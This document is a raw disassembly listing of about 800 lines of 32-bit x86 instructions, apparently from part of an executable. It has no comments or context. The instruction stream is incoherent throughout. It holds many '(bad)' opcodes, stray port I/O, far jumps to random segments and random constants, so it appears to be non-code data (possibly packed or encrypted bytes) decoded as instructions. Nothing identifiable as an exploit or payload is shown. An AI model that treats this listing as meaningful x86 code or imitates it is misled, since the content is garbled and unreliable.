  413d2d:	(bad)  
  413d2e:	idiv   DWORD PTR [ecx+ebp*8+0x757192e8]
  413d35:	aad    0xeb
  413d37:	ret    
  413d38:	in     eax,0xfd
  413d3a:	push   edi
  413d3b:	lods   al,BYTE PTR ds:[esi]
  413d3c:	xchg   edi,eax
  413d3d:	sti    
  413d3e:	retf   0xd9ab
  413d41:	mov    ds,WORD PTR [ebx+0x65]
  413d44:	jmp    0x7369720a
  413d49:	push   0xb75ba98f
  413d4e:	dec    eax
  413d4f:	push   edx
  413d50:	inc    esp
  413d51:	cmc    
  413d52:	out    0xc2,al
  413d54:	sbb    dh,BYTE PTR [ebx+0x5e]
  413d57:	push   ecx
  413d58:	gs sahf 
  413d5a:	sbb    DWORD PTR [ebp-0x794fec1f],edx
  413d60:	test   DWORD PTR [ebp+0x1c],ebx
  413d63:	(bad)  
  413d65:	jne    0x413d30
  413d67:	test   al,0x5a
  413d69:	shl    dl,cl
  413d6b:	shl    BYTE PTR [eax+0x529f8cb9],0x7f
  413d72:	push   esi
  413d73:	std    
  413d74:	repnz popa 
  413d76:	imul   ecx,DWORD PTR [eax],0x6edc64a9
  413d7c:	or     al,0x5f
  413d7e:	or     edi,esi
  413d80:	xchg   esi,eax
  413d81:	pop    ebx
  413d82:	lods   al,BYTE PTR ds:[esi]
  413d83:	pop    edi
  413d84:	fwait
  413d85:	jle    0x413de5
  413d87:	out    0xc2,al
  413d89:	cld    
  413d8a:	inc    edx
  413d8b:	out    0x5c,al
  413d8d:	jmp    0x1703687d
  413d92:	div    BYTE PTR [esp+eiz*2+0x35]
  413d96:	jns    0x413dbb
  413d98:	sbb    eax,0xc9d1a7c5
  413d9d:	cmp    DWORD PTR [edi],ebx
  413d9f:	cmc    
  413da0:	push   DWORD PTR [eax-0x42]
  413da3:	mov    edi,0xf59b54e
  413da8:	loopne 0x413d2e
  413daa:	aam    0xd0
  413dac:	repz cmp eax,0x76ceb638
  413db2:	loopne 0x413d7a
  413db4:	sbb    eax,0x53b73647
  413db9:	adc    ebp,DWORD PTR [edi+0x37]
  413dbc:	mov    ch,0x6c
  413dbe:	jmp    0x413d40
  413dc0:	or     edx,DWORD PTR [edi]
  413dc2:	fwait
  413dc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413dc4:	sbb    eax,0x5e942c12
  413dc9:	pop    ebx
  413dca:	aad    0xb5
  413dcc:	ss mov bh,0x91
  413dcf:	js     0x413de9
  413dd1:	ret    
  413dd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dd3:	(bad)  
  413dd4:	cdq    
  413dd5:	aad    0x1
  413dd7:	cwde   
  413dd8:	cmp    eax,DWORD PTR [ecx+0x53]
  413ddb:	in     al,dx
  413ddc:	lahf   
  413ddd:	mov    cl,0x1c
  413ddf:	mov    al,0x75
  413de1:	cs push fs
  413de4:	jnp    0x413e5d
  413de6:	cmp    eax,DWORD PTR [ecx+ebx*8]
  413de9:	mov    dh,0xe1
  413deb:	sbb    edi,DWORD PTR [edx+edx*8-0x23]
  413def:	clc    
  413df0:	mov    eax,0xf723f9c9
  413df5:	and    eax,0x313832a7
  413dfa:	sub    eax,0xcb761d77
  413dff:	sub    eax,DWORD PTR [ebx-0xb5ec6]
  413e05:	inc    DWORD PTR [edi+0x6f307d3c]
  413e0b:	in     al,0x75
  413e0d:	jbe    0x413e89
  413e0f:	jne    0x413e71
  413e11:	rcl    DWORD PTR [edx+edi*1],1
  413e14:	in     eax,0xa2
  413e16:	add    dl,BYTE PTR [ebp+0x1019a67f]
  413e1c:	mov    al,BYTE PTR [ebx-0x7db33dba]
  413e22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e23:	dec    eax
  413e24:	in     eax,0xe3
  413e26:	les    ecx,FWORD PTR [edx]
  413e28:	push   eax
  413e29:	mov    edx,0xc4201d25
  413e2e:	cmp    eax,DWORD PTR [esi+0x1]
  413e31:	pop    ds
  413e32:	(bad)  
  413e33:	stc    
  413e34:	jmp    0x80e7:0xf8a5dd83
  413e3b:	mov    edi,es
  413e3d:	shl    BYTE PTR [edx-0xfd36882],0x41
  413e44:	imul   esp,DWORD PTR ds:[ebx-0x53],0xfd7e61a7
  413e4c:	xchg   BYTE PTR [eax+0x856559e],ah
  413e52:	fucom  st(6)
  413e54:	bound  edi,QWORD PTR [eax-0x6c9d0d08]
  413e5a:	jae    0x413e74
  413e5c:	mov    ah,0xa5
  413e5e:	adc    al,0xb4
  413e60:	xchg   DWORD PTR [edx],esi
  413e62:	mov    ds:0x13ed1c0d,al
  413e67:	test   BYTE PTR [edi-0x29b67f1d],al
  413e6d:	xchg   edi,eax
  413e6e:	inc    ebp
  413e6f:	pusha  
  413e70:	inc    esp
  413e71:	dec    esp
  413e72:	jecxz  0x413e64
  413e74:	out    dx,eax
  413e75:	aaa    
  413e76:	aam    0xd2
  413e78:	fild   QWORD PTR [ecx]
  413e7a:	jecxz  0x413efb
  413e7c:	or     eax,0x6568b4a2
  413e81:	dec    edx
  413e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e83:	xor    dl,BYTE PTR [edx+0x33]
  413e86:	sti    
  413e87:	bound  ebx,QWORD PTR [ebx+0x59]
  413e8a:	fsub   st,st(3)
  413e8c:	sti    
  413e8d:	pop    ecx
  413e8e:	ins    BYTE PTR es:[edi],dx
  413e8f:	ret    
  413e90:	gs call 0x442c:0x1c091e7f
  413e98:	pop    esi
  413e99:	fidiv  WORD PTR [edx]
  413e9b:	cmp    DWORD PTR gs:[ebx-0x45],0x17
  413ea0:	mov    ch,0x83
  413ea2:	cmp    ch,dh
  413ea4:	ret    
  413ea5:	mov    ebp,0xe433df8a
  413eaa:	jmp    0x8518:0xdb1ec46e
  413eb1:	sbb    eax,0x8377a940
  413eb6:	sbb    al,0x4d
  413eb8:	mov    bh,0x91
  413eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ebc:	cld    
  413ebd:	mov    dh,0x64
  413ebf:	popa   
  413ec0:	in     al,0x9
  413ec2:	jbe    0x413f2d
  413ec4:	fidiv  WORD PTR [edi]
  413ec6:	or     edx,DWORD PTR [eax-0x1656e34]
  413ecc:	in     eax,0x6d
  413ece:	out    dx,eax
  413ecf:	push   edi
  413ed0:	fcmovnbe st,st(1)
  413ed2:	inc    ebp
  413ed3:	adc    edi,DWORD PTR [ebx+0x74871b1d]
  413ed9:	pmaddwd mm4,QWORD PTR [ebx]
  413edc:	les    ebp,FWORD PTR [edx-0x1989ca8c]
  413ee2:	sub    eax,0x98d8c16d
  413ee7:	ins    BYTE PTR es:[edi],dx
  413ee8:	loopne 0x413eb3
  413eea:	imul   esp,DWORD PTR [esi+0x40],0x1a
  413eee:	enter  0x3cfa,0x44
  413ef2:	dec    eax
  413ef3:	mov    ch,0x35
  413ef5:	mov    ebp,0xdfec3acd
  413efa:	jo     0x413f0b
  413efc:	cmc    
  413efd:	mov    ecx,0x9a146070
  413f02:	jnp    0x413f25
  413f04:	lods   al,BYTE PTR ds:[esi]
  413f05:	imul   ebx,eax,0xdeb6340c
  413f0b:	fnsave [esp+esi*2+0x34]
  413f0f:	pop    edx
  413f10:	out    0xc0,al
  413f12:	and    DWORD PTR [esi+0x5672eb6c],edi
  413f18:	jle    0x413e9e
  413f1a:	push   ds
  413f1b:	or     al,0x14
  413f1d:	inc    eax
  413f1e:	les    edi,FWORD PTR [edi+0x68d4ac86]
  413f24:	jp     0x413f7b
  413f26:	pop    es
  413f27:	and    ah,BYTE PTR [eax]
  413f29:	(bad)  [ecx]
  413f2b:	add    al,0x83
  413f2d:	mov    ebx,0xd20f4
  413f32:	add    eax,0x4f6304b4
  413f37:	lahf   
  413f38:	push   ds
  413f39:	mov    ah,0xf4
  413f3b:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  413f3d:	jl     0x413f10
  413f3f:	lods   al,BYTE PTR ds:[esi]
  413f40:	je     0x413efe
  413f42:	je     0x413eee
  413f44:	jle    0x413f2d
  413f46:	retf   0xbe41
  413f49:	std    
  413f4a:	les    esp,FWORD PTR [ecx-0x23]
  413f4d:	add    bl,BYTE PTR [edx]
  413f4f:	jg     0x413fbb
  413f51:	bound  esi,QWORD PTR [edi-0x26]
  413f54:	jbe    0x413ef4
  413f56:	mov    al,ds:0x3ee8e104
  413f5b:	mov    eax,0xeb4c95c3
  413f60:	in     eax,dx
  413f61:	mov    esp,0xfb845bc1
  413f66:	fs xor al,0x71
  413f69:	stc    
  413f6a:	cmc    
  413f6b:	cmp    eax,DWORD PTR [eax+ebp*1]
  413f6e:	scas   eax,DWORD PTR es:[edi]
  413f6f:	adc    DWORD PTR ds:0x72906af4,ebx
  413f75:	adc    esi,ecx
  413f77:	cs jmp 0x8ec6:0xbdc5dfea
  413f7f:	adc    BYTE PTR [ebp+0x63],bh
  413f82:	xor    BYTE PTR [ebx+0x39b435cf],ah
  413f88:	sbb    BYTE PTR [esi-0x1b],ah
  413f8b:	xchg   edi,eax
  413f8c:	ss inc ecx
  413f8e:	sbb    BYTE PTR [ecx+0x3ccb7c69],dl
  413f94:	and    al,0x55
  413f96:	mov    ecx,0x8c8a1493
  413f9b:	popa   
  413f9c:	pop    ds
  413f9d:	cwde   
  413f9e:	fdivr  QWORD PTR [esi+eax*4+0x3a]
  413fa2:	or     esp,DWORD PTR [esi-0x74]
  413fa5:	sbb    eax,0x19162a9e
  413faa:	in     eax,0x5e
  413fac:	cmp    dl,BYTE PTR [ecx-0x7]
  413faf:	stos   BYTE PTR es:[edi],al
  413fb0:	cmc    
  413fb1:	in     eax,0xe8
  413fb3:	xor    esp,edx
  413fb5:	adc    al,0x49
  413fb7:	adc    BYTE PTR ds:0x81444071,ch
  413fbd:	adc    al,0xe2
  413fbf:	and    eax,0x19919f4
  413fc4:	push   es
  413fc5:	jecxz  0x413f7c
  413fc7:	mov    ecx,0x433e7a9d
  413fcc:	xor    BYTE PTR [ebp-0x71],dl
  413fcf:	mov    dh,0x9
  413fd1:	adc    BYTE PTR [ecx],cl
  413fd3:	or     DWORD PTR [edx*4+0x3994078a],ebx
  413fda:	add    al,0x19
  413fdc:	mov    esp,0x6c14d3ce
  413fe1:	cmp    esi,ecx
  413fe3:	mov    ebx,0xb01a0d0c
  413fe8:	jge    0x414054
  413fea:	test   al,0x45
  413fec:	and    ebp,ebp
  413fee:	test   eax,0xe7e72eaf
  413ff3:	mov    dh,0x46
  413ff5:	pop    ecx
  413ff6:	xchg   ebp,eax
  413ff7:	pusha  
  413ff8:	ret    
  413ff9:	inc    ecx
  413ffa:	ins    BYTE PTR es:[edi],dx
  413ffb:	mov    al,ds:0x298d06f3
  414000:	sbb    esp,DWORD PTR [ecx+0x6d]
  414003:	dec    ecx
  414004:	and    eax,0x5783e6e7
  414009:	mov    DWORD PTR [ecx],0x5477a101
  41400f:	fsubr  DWORD PTR [edi+eiz*8+0x6a8683c]
  414016:	inc    edi
  414017:	scas   al,BYTE PTR es:[edi]
  414018:	pop    eax
  414019:	adc    al,0x5a
  41401b:	jge    0x414090
  41401d:	jmp    0x32ab:0x93889720
  414024:	add    DWORD PTR [ebx+0x1ff3e209],0xffffffbb
  41402b:	mov    ds:0xa19401f9,eax
  414030:	sub    ecx,edx
  414032:	jne    0x4140a4
  414034:	jae    0x414068
  414036:	xchg   edi,eax
  414037:	jnp    0x4140ab
  414039:	cmp    eax,0xb5c80dd1
  41403e:	loope  0x414017
  414040:	pop    ss
  414041:	dec    esi
  414042:	adc    al,0x9b
  414044:	std    
  414045:	jae    0x41401a
  414047:	and    eax,0x1137af66
  41404c:	push   eax
  41404d:	mov    eax,0xfede8ae6
  414052:	and    al,0x99
  414054:	and    ebx,DWORD PTR [eax-0x2325bd96]
  41405a:	adc    BYTE PTR [esi+ebx*8-0x22c2ed16],cl
  414061:	dec    edi
  414062:	sub    al,0x8e
  414064:	pop    esp
  414065:	out    0xef,al
  414067:	xchg   DWORD PTR [ecx],esi
  414069:	push   ds
  41406a:	xchg   edi,eax
  41406b:	mov    BYTE PTR [esi-0x64],ah
  41406e:	jnp    0x414021
  414070:	iret   
  414071:	cmp    eax,0x91dded97
  414076:	jbe    0x4140ea
  414078:	lods   al,BYTE PTR ds:[esi]
  414079:	pop    ecx
  41407a:	push   es
  41407b:	cld    
  41407c:	pop    eax
  41407d:	ficomp DWORD PTR [eax-0x7c162555]
  414083:	sar    al,1
  414085:	sbb    eax,0x6066640
  41408a:	inc    eax
  41408b:	sub    edx,DWORD PTR [eax-0x3c2ff331]
  414091:	cmp    DWORD PTR [eax+0x53f82257],eax
  414097:	loopne 0x414068
  414099:	ss inc edi
  41409b:	inc    esi
  41409c:	mov    ebx,0xf1a7e4d1
  4140a1:	adc    DWORD PTR [ecx+0x42974100],ecx
  4140a7:	mov    bl,0xe9
  4140a9:	call   0xca4c:0x9ca797f9
  4140b0:	add    bh,bl
  4140b2:	rcr    BYTE PTR ds:0xe32f837c,cl
  4140b8:	sub    edi,DWORD PTR [edi+eiz*1]
  4140bb:	test   al,0xba
  4140bd:	cmp    ch,cl
  4140bf:	(bad)  
  4140c0:	stc    
  4140c1:	imul   esp,DWORD PTR [ecx+ecx*2-0x4156bc1d],0xa6c1bcd9
  4140cc:	stc    
  4140cd:	inc    eax
  4140ce:	test   DWORD PTR [ecx-0x20],ecx
  4140d1:	mov    dh,0xe2
  4140d3:	inc    ecx
  4140d4:	push   ebp
  4140d5:	sub    eax,0x765e9139
  4140da:	pop    ecx
  4140db:	arpl   WORD PTR [ebx],dx
  4140dd:	repnz aam 0xc7
  4140e0:	add    al,0x17
  4140e2:	xchg   esp,eax
  4140e3:	mov    BYTE PTR [ebp+0x148c6012],cl
  4140e9:	mov    ecx,0xe3d8fecd
  4140ee:	mov    eax,0xcb613eac
  4140f3:	adc    al,BYTE PTR [esi+0xb90dbbe]
  4140f9:	dec    esi
  4140fa:	mov    dl,0x48
  4140fc:	(bad)  
  4140fd:	sbb    eax,0x6e743930
  414102:	test   BYTE PTR [ecx+edi*8+0x53],bh
  414106:	fidiv  DWORD PTR [edx+0x12]
  414109:	mov    cl,0x29
  41410b:	push   ebp
  41410c:	lods   al,BYTE PTR ds:[esi]
  41410d:	cmp    ah,BYTE PTR [edi-0x2f]
  414110:	mov    ?,WORD PTR [eax+0xa]
  414113:	dec    ebp
  414114:	push   0x510146e8
  414119:	jecxz  0x41418b
  41411b:	mov    al,0x8c
  41411d:	mov    esp,0x46901c4a
  414122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414123:	cli    
  414124:	shl    BYTE PTR [ecx-0x2c],0x43
  414128:	dec    edx
  414129:	mov    al,0x62
  41412b:	add    BYTE PTR [esi+eiz*2-0x3c],dl
  41412f:	pop    edx
  414130:	jecxz  0x4140b3
  414132:	bound  ebx,QWORD PTR [edx+0x450c2988]
  414138:	mov    edi,0x279050ee
  41413d:	xor    eax,0x6bdf935c
  414142:	fwait
  414143:	push   edi
  414144:	ins    DWORD PTR es:[edi],dx
  414145:	dec    edi
  414146:	lahf   
  414147:	les    eax,FWORD PTR [ebp+0x78]
  41414a:	retf   
  41414b:	inc    esp
  41414c:	sbb    al,0xe7
  41414e:	fst    QWORD PTR [ecx+0x4fc6b8ea]
  414154:	pusha  
  414155:	(bad)  
  414157:	mov    dl,0xa5
  414159:	mov    ch,ch
  41415b:	inc    esi
  41415c:	xor    al,0x14
  41415e:	cmp    bl,ah
  414160:	cmp    al,0xd6
  414162:	js     0x4140e9
  414164:	pop    esi
  414165:	lds    dx,DWORD PTR es:[ecx+0x5f65d260]
  41416d:	test   bh,dl
  41416f:	mov    esi,0x41079b54
  414174:	test   DWORD PTR [edi+edi*4],edi
  414177:	push   0xb7545aa
  41417c:	pop    ds
  41417d:	adc    bh,BYTE PTR [eiz*1+0x77811037]
  414184:	adc    BYTE PTR [eax],cl
  414186:	aaa    
  414187:	imul   eax,DWORD PTR [ebx+0x6daf2d85],0x3f
  41418e:	cld    
  41418f:	int3   
  414190:	jbe    0x4141f1
  414192:	int3   
  414193:	mov    bh,0xf4
  414195:	adc    esi,DWORD PTR [ebx+0x39]
  414198:	sti    
  414199:	rol    BYTE PTR [ebp+0x26],1
  41419c:	std    
  41419d:	stc    
  41419e:	jnp    0x414167
  4141a0:	jge    0x41419e
  4141a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141a3:	push   esp
  4141a4:	data16 jp 0x41418c
  4141a7:	mov    eax,0x2587efe9
  4141ac:	dec    ecx
  4141ad:	pop    ecx
  4141ae:	mov    ecx,0x580b305f
  4141b3:	loop   0x41413f
  4141b5:	jne    0x41422a
  4141b7:	pop    ebp
  4141b8:	or     bh,BYTE PTR [edi+0x2c]
  4141bb:	add    al,0xe3
  4141bd:	sbb    BYTE PTR [edi],ch
  4141bf:	in     al,dx
  4141c0:	inc    edi
  4141c1:	mov    edx,edi
  4141c3:	adc    esp,edx
  4141c5:	lahf   
  4141c6:	shr    DWORD PTR [edx],0x2b
  4141c9:	add    eax,0x31752318
  4141ce:	out    0x13,eax
  4141d0:	(bad)  
  4141d1:	jb     0x4141e6
  4141d3:	sub    BYTE PTR [eax-0x2a3ca4fa],al
  4141d9:	xchg   ecx,eax
  4141da:	popf   
  4141db:	ficomp WORD PTR [ebp+0x16c54443]
  4141e1:	(bad)  
  4141e2:	xchg   ecx,eax
  4141e3:	mov    bl,0x22
  4141e5:	and    eax,0xe3679619
  4141ea:	arpl   cx,ax
  4141ec:	outs   dx,DWORD PTR ds:[esi]
  4141ed:	daa    
  4141ee:	xor    DWORD PTR [esp+esi*1-0x14],edi
  4141f2:	das    
  4141f3:	mov    ah,0x3c
  4141f5:	dec    edi
  4141f6:	push   ebp
  4141f7:	inc    BYTE PTR ds:0xd856af96
  4141fd:	leave  
  4141fe:	cld    
  4141ff:	adc    al,0xe1
  414201:	imul   ecx,ebx,0x34
  414204:	jg     0x4141f2
  414206:	xchg   DWORD PTR [edx-0x60f66567],ebx
  41420c:	not    DWORD PTR [ebp+ebx*4-0x1da02d50]
  414213:	mov    bh,0x4
  414215:	loop   0x4141de
  414217:	int3   
  414218:	gs push ss
  41421a:	dec    eax
  41421b:	mov    eax,ds:0x25514b7c
  414220:	push   esp
  414221:	(bad)  
  414222:	adc    al,0xae
  414224:	mov    ebp,0x729d7ace
  414229:	xor    ah,BYTE PTR [ebx+0x4136cbff]
  41422f:	mov    bh,0xa6
  414231:	dec    edx
  414232:	std    
  414233:	push   ebx
  414234:	inc    ebp
  414235:	ja     0x4141d3
  414237:	call   0xaab9:0x52af840f
  41423e:	jo     0x4141fd
  414240:	and    dl,dl
  414242:	popf   
  414243:	ficomp DWORD PTR [ecx*8+0x24b4e62a]
  41424a:	and    cl,BYTE PTR [ecx-0x30]
  41424d:	mov    ecx,0x9b2eff81
  414252:	push   ecx
  414253:	push   edx
  414254:	jb     0x4142c2
  414256:	mov    DWORD PTR [esi],ecx
  414258:	sub    esp,DWORD PTR [edx+ecx*4]
  41425b:	or     eax,0x49f93b97
  414260:	pop    eax
  414261:	and    eax,0x528ae938
  414266:	int    0xd8
  414268:	jl     0x414219
  41426a:	mov    esi,0x7cb61240
  41426f:	retf   0xe3f3
  414272:	out    0x62,eax
  414274:	out    0x5c,al
  414276:	push   ss
  414277:	(bad)  
  414278:	push   0x2
  41427a:	jecxz  0x4142f3
  41427c:	out    0xfd,eax
  41427e:	enter  0x277b,0x48
  414282:	mov    dh,0x2f
  414284:	bound  ecx,QWORD PTR [eax+ebx*1-0x315c0bb4]
  41428b:	xchg   edi,eax
  41428c:	xchg   ebp,eax
  41428d:	mov    al,0xc6
  41428f:	mov    WORD PTR [edi],?
  414291:	enter  0xc963,0xb9
  414295:	mov    edx,0xd731b857
  41429a:	jecxz  0x4142ce
  41429c:	sbb    DWORD PTR [edi-0x55],ecx
  41429f:	fild   QWORD PTR [eax-0x5f5a257f]
  4142a5:	push   es
  4142a6:	sbb    eax,0xfede95aa
  4142ab:	data16 xchg BYTE PTR [edi+0x73],dl
  4142af:	mov    eax,ds:0x885ef1b5
  4142b4:	loopne 0x414283
  4142b6:	(bad)  
  4142b7:	mov    ebp,0x73139f3
  4142bc:	push   edx
  4142bd:	adc    al,0xaf
  4142bf:	push   ds
  4142c0:	dec    BYTE PTR [edi+eiz*2+0x32]
  4142c4:	or     DWORD PTR [eax-0x30436d7c],eax
  4142ca:	lea    esi,[ebx+0x1d]
  4142cd:	pop    edi
  4142ce:	enter  0xd795,0x58
  4142d2:	frstor [ecx-0x3e]
  4142d5:	push   ebx
  4142d6:	sar    BYTE PTR [ebx-0x52f7e3d1],1
  4142dc:	pop    ecx
  4142dd:	or     esi,DWORD PTR [esi-0x45]
  4142e0:	jnp    0x414285
  4142e2:	or     eax,0x678c5c43
  4142e7:	je     0x41426e
  4142e9:	inc    ebx
  4142ea:	out    dx,eax
  4142eb:	ret    0xf1b1
  4142ee:	(bad)  
  4142ef:	mov    ecx,0x30869e37
  4142f4:	push   esi
  4142f5:	mov    eax,ds:0xdc08588a
  4142fa:	xor    eax,0x78193295
  4142ff:	popf   
  414300:	pop    ds
  414301:	ins    BYTE PTR es:[edi],dx
  414302:	ret    0x1fd2
  414305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414306:	std    
  414307:	adc    DWORD PTR [esi],eax
  414309:	jp     0x414373
  41430b:	leave  
  41430c:	hlt    
  41430d:	jmp    0x414342
  41430f:	jo     0x4142f4
  414311:	mov    esp,0x6ab4a1d0
  414316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414317:	xor    BYTE PTR [eax-0x7b9f0646],dh
  41431d:	mov    eax,ds:0x14351e48
  414322:	fwait
  414323:	dec    esi
  414324:	enter  0xae45,0x41
  414328:	jne    0x4142bd
  41432a:	lods   eax,DWORD PTR gs:[esi]
  41432c:	xchg   DWORD PTR [eax-0x7],edi
  41432f:	jmp    0x6cdeb57d
  414334:	sbb    DWORD PTR [esi],edi
  414336:	ss mov ?,ebx
  414339:	mov    dh,0x85
  41433b:	push   cs
  41433c:	jl     0x41437f
  41433e:	push   eax
  41433f:	sti    
  414340:	add    edi,edi
  414342:	test   DWORD PTR [ebx],eax
  414344:	cs jmp 0xe8fa:0x90ae240f
  41434c:	pmaxsw mm1,QWORD PTR [ebx+0x22dc12ca]
  414353:	dec    edx
  414354:	mov    edi,0x411a414
  414359:	cmp    al,0xb5
  41435b:	sub    al,0x5e
  41435d:	ss call 0xab7:0xfb589616
  414365:	icebp  
  414366:	mov    dh,0x77
  414368:	in     eax,0x8
  41436a:	mov    WORD PTR [esi],ds
  41436c:	daa    
  41436d:	imul   esp,DWORD PTR [ecx],0x2d7f9558
  414373:	mov    DWORD PTR [eax],ebx
  414375:	cmp    DWORD PTR [eax-0x5c],0x5d
  414379:	std    
  41437a:	mov    bh,0x40
  41437c:	das    
  41437d:	jp     0x41431b
  41437f:	int    0xc6
  414381:	mov    dh,0xa8
  414383:	cmp    esi,DWORD PTR [esi-0x2b]
  414386:	scas   al,BYTE PTR es:[edi]
  414387:	std    
  414388:	fmulp  st(1),st
  41438a:	and    DWORD PTR [eax],eax
  41438c:	scas   al,BYTE PTR es:[edi]
  41438d:	mov    edx,0xd6dec6c8
  414392:	cmp    eax,0xdd7c24ad
  414397:	mov    ecx,0xc92d45b3
  41439c:	sahf   
  41439d:	out    dx,al
  41439e:	rcl    edi,1
  4143a0:	gs cld 
  4143a2:	ins    BYTE PTR es:[edi],dx
  4143a3:	dec    esp
  4143a4:	ret    0xdb8e
  4143a7:	mov    bl,0x34
  4143a9:	mov    bh,0x12
  4143ab:	(bad)  
  4143ac:	pop    ds
  4143ad:	enter  0x12dc,0xf2
  4143b1:	aam    0xf6
  4143b3:	shl    ah,1
  4143b5:	dec    esp
  4143b6:	test   eax,0x50e065cb
  4143bb:	inc    edi
  4143bc:	into   
  4143bd:	pop    ss
  4143be:	bound  edx,QWORD PTR [eax+ebx*2]
  4143c1:	lods   al,BYTE PTR ds:[esi]
  4143c2:	pop    ss
  4143c3:	cmp    ecx,DWORD PTR [eax-0x70]
  4143c6:	mov    ecx,0x2e48c7e3
  4143cb:	dec    ebp
  4143cc:	and    edi,0x43d52aff
  4143d2:	adc    eax,0xb6af9f1c
  4143d7:	cld    
  4143d8:	or     eax,0x5c81b035
  4143dd:	pop    ebp
  4143de:	hlt    
  4143df:	ror    DWORD PTR [edx-0x13bf8504],0xf1
  4143e6:	dec    ebx
  4143e7:	jne    0x41436a
  4143e9:	dec    eax
  4143ea:	pushf  
  4143eb:	sahf   
  4143ec:	gs stos DWORD PTR es:[edi],eax
  4143ee:	adc    DWORD PTR [ebx-0x3f4acdc2],ecx
  4143f4:	outs   dx,BYTE PTR ds:[esi]
  4143f5:	and    BYTE PTR [ecx+eax*1],dl
  4143f8:	ja     0x414450
  4143fa:	pop    edi
  4143fb:	push   ss
  4143fc:	mov    WORD PTR [edx+0x32],gs
  4143ff:	push   edi
  414400:	inc    esi
  414401:	sub    al,0x2a
  414403:	xchg   esi,eax
  414404:	repnz fisubr WORD PTR [ebp-0x65]
  414408:	pop    esi
  414409:	jb     0x4143a1
  41440b:	or     edx,DWORD PTR [eax]
  41440d:	outs   dx,DWORD PTR ds:[esi]
  41440e:	xor    ebp,esp
  414410:	bound  edi,QWORD PTR [edx+0x58289626]
  414416:	add    dl,BYTE PTR [eax-0x2f65944d]
  41441c:	fisubr DWORD PTR [ebx+0x468809d4]
  414422:	lea    esi,[edi]
  414424:	mov    ds:0x8cc03252,al
  414429:	inc    eax
  41442a:	cmp    ch,BYTE PTR [eax]
  41442c:	int3   
  41442d:	or     ah,BYTE PTR ds:0xb8b971f7
  414433:	not    DWORD PTR [esi+0x696063fb]
  414439:	pop    ss
  41443a:	outs   dx,BYTE PTR ds:[esi]
  41443b:	or     DWORD PTR [ecx-0x5c],ecx
  41443e:	push   eax
  41443f:	add    BYTE PTR [esi],ah
  414441:	adc    esp,DWORD PTR [ecx-0x322f41e5]
  414447:	arpl   WORD PTR [ebx-0x30],bp
  41444a:	jo     0x414438
  41444c:	ret    0x2070
  41444f:	sub    dh,dl
  414451:	mov    esp,0xf014ed51
  414456:	icebp  
  414457:	daa    
  414458:	aad    0xdb
  41445a:	ins    DWORD PTR es:[edi],dx
  41445b:	retf   
  41445c:	xchg   ecx,eax
  41445d:	cwde   
  41445e:	push   0x8ef53209
  414463:	dec    ebx
  414464:	ret    
  414465:	fsubrp st(4),st
  414467:	and    bl,cl
  414469:	dec    edx
  41446a:	sub    BYTE PTR cs:[eax],ah
  41446d:	nop
  41446e:	mov    ds:0x41ee4c6a,al
  414473:	mov    ah,0xeb
  414475:	add    BYTE PTR [edx-0x2a3a50fe],dl
  41447b:	(bad)
  41447e:	test   eax,0xd45ede8
  414483:	sbb    ebx,ebp
  414485:	fnsave [ebp+0x594f1adc]
  41448b:	adc    BYTE PTR [edx+0x69b12b5f],bl
  414491:	mov    cl,BYTE PTR [edx+ebx*2]
  414494:	sub    al,0x45
  414496:	scas   al,BYTE PTR es:[edi]
  414497:	icebp  
  414498:	in     eax,0xf4
  41449a:	fcmovnu st,st(6)
  41449c:	jnp    0x414422
  41449e:	stc    
  41449f:	sub    DWORD PTR gs:[eax+0x2bae7efd],edx
  4144a6:	ja     0x414525
  4144a8:	jp     0x4144e5
  4144aa:	or     BYTE PTR [ebp+0x64ff0d84],dl
  4144b0:	out    dx,eax
  4144b1:	dec    eax
  4144b2:	add    edx,esi
  4144b4:	xchg   ecx,eax
  4144b5:	icebp  
  4144b6:	(bad)  
  4144b8:	lahf   
  4144b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144ba:	in     eax,0xa0
  4144bc:	psrad  mm2,QWORD PTR ds:0x924e958f
  4144c3:	and    BYTE PTR [ebx-0x3193e301],dl
  4144c9:	fild   DWORD PTR [ecx+0x24]
  4144cc:	sbb    dl,0x2c
  4144cf:	sub    bh,BYTE PTR [ecx-0x61dc33bf]
  4144d5:	jecxz  0x414504
  4144d7:	test   ebx,esi
  4144d9:	aad    0xb8
  4144db:	in     eax,dx
  4144dc:	mov    eax,0xeb30b084
  4144e1:	ret    0xbb86
  4144e4:	or     cl,BYTE PTR [ebx]
  4144e6:	mov    DWORD PTR [edx+0x179f0dce],ecx
  4144ec:	cmp    al,0x83
  4144ee:	loopne 0x414488
  4144f0:	sbb    dh,cl
  4144f2:	sbb    eax,esp
  4144f4:	daa    
  4144f5:	(bad)  
  4144f7:	lods   eax,DWORD PTR ds:[esi]
  4144f8:	jns    0x414534
  4144fa:	mov    dl,0x39
  4144fc:	ficomp WORD PTR [ebp-0x20]
  4144ff:	mov    ebx,0x30df809e
  414504:	adc    al,0xc1
  414506:	ret    
  414507:	dec    edi
  414508:	sub    al,0x6
  41450a:	lods   al,BYTE PTR ds:[esi]
  41450b:	dec    ecx
  41450c:	inc    ebp
  41450d:	int    0x63
  41450f:	inc    esi
  414510:	mov    eax,fs
  414512:	cmp    eax,0xe68f49eb
  414517:	push   es
  414518:	jle    0x4144a5
  41451a:	or     al,0xcd
  41451c:	sub    al,0xd1
  41451e:	mov    esp,0xd00a01eb
  414523:	jp     0x41457e
  414525:	cmp    BYTE PTR [ecx],0x52
  414528:	add    al,0xd2
  41452a:	in     al,0x56
  41452c:	and    eax,0x3e32aa6e
  414531:	out    dx,eax
  414532:	sbb    eax,0xdc2c20e2
  414537:	lea    ebp,[edx+0x2ee8e9cc]
  41453d:	fwait
  41453e:	push   es
  41453f:	mov    eax,0x18ef4ff1
  414544:	inc    esi
  414545:	xchg   edx,eax
  414546:	or     DWORD PTR [ecx-0x64],edx
